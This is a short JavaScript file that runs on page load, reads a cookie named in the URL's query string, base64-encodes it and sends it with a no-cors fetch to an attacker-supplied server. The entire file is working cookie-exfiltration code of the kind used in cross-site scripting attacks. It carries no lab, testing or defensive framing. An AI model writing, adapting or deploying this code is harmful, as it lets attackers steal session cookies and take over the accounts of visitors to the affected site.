function exfiltraCookie(cookieName, targetUrl) {
  // Parse document.cookie to extract individual cookies
  const cookies = document.cookie.split(';').map(c => c.trim());
  
  let cookieValue = null;
  for (const cookie of cookies) {
    const [name, value] = cookie.split('=');
    if (name === cookieName) {
      cookieValue = value;
      break;
    }
  }
  
  // If cookie not found, return early
  if (cookieValue === null) {
    console.warn(`Cookie "${cookieName}" not found`);
    return;
  }
  
  // Base64 encode the cookie value
  const encoded = btoa(cookieValue);
  
  // Construct the full URL with encoded value
  const fullUrl = `${targetUrl}/${encoded}`;
  
  // Send the request
  fetch(fullUrl, { mode: 'no-cors' })
    .then(() => console.log(`Cookie sent to ${fullUrl}`))
    .catch(err => console.error('Failed to send cookie:', err));
}

// Execute on import - parse query parameters
const params = new URLSearchParams(window.location.search);
const cookieName = params.get('cookie');
const serverUrl = params.get('server');

if (cookieName && serverUrl) {
  exfiltraCookie(cookieName, serverUrl);
} else {
  console.warn('Missing "cookie" or "server" query parameters');
}
